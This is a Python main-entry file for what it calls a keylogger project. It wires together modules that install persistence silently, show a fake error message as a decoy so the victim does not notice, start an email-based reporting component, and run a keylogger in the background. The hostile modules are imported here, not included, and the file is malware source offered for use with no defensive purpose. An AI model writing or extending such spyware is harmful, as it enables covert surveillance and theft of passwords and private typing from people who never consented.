"""
Module: Main Entry Point
Description: Orchestrates the keylogger, network modules, and system persistence.
"""

import threading
from keylogger import Keylogger
from network import EmailSender
import system_ops # Import the new module

def main():
    print("Security Project: Core Modules Starting...")
    
    
    # 1. Install Persistence (Runs silently)
    system_ops.install_persistence()
    
    # 2. Show Decoy Error:Non-blocking
    # We run it in a thread so the keylogger starts immediately in the background
    # while the user is staring at the error message.
    error_thread = threading.Thread(target=system_ops.show_fake_error)
    error_thread.start()
    
    # ------------------------------

    # Initialize components
    network = EmailSender()
    logger = Keylogger()
    
    # Start the network reporting in the background
    network.start()
    
    # Start the keylogger (this blocks the main thread)
    logger.start()

if __name__ == "__main__":
    main()